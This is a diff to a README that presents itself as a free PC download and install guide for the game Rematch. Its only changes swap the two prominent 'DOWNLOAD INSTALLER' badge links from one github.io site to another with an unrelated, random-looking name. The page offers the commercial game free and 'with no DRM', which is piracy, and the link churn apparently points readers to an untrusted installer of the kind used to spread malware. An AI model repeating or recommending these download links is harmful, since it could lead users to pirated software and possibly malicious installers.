@@ -1,6 +1,6 @@
 # Rematch — Free PC Game Download & Install Guide
 
-[![⬇ DOWNLOAD INSTALLER — REMATCH ⚔️](https://img.shields.io/badge/⬇%20DOWNLOAD-INSTALLER%20%E2%80%94%20REMATCH-red?style=for-the-badge&logo=windows&logoColor=white)](https://rematch-install-pc-game.github.io/.github)
+[![⬇ DOWNLOAD INSTALLER — REMATCH ⚔️](https://img.shields.io/badge/⬇%20DOWNLOAD-INSTALLER%20%E2%80%94%20REMATCH-red?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/)
 
 ## 🧠 About the Game
 
@@ -22,7 +22,7 @@ This guide helps you **freely download and install Rematch for PC**, with no DRM
 
 ---
 
-[![⬇ DOWNLOAD INSTALLER — REMATCH ⚔️](https://img.shields.io/badge/⬇%20DOWNLOAD-INSTALLER%20%E2%80%94%20REMATCH-red?style=for-the-badge&logo=windows&logoColor=white)](https://rematch-install-pc-game.github.io/.github)
+[![⬇ DOWNLOAD INSTALLER — REMATCH ⚔️](https://img.shields.io/badge/⬇%20DOWNLOAD-INSTALLER%20%E2%80%94%20REMATCH-red?style=for-the-badge&logo=windows&logoColor=white)](https://ryadikmntiiks.github.io/.github/)
 
 ---
 
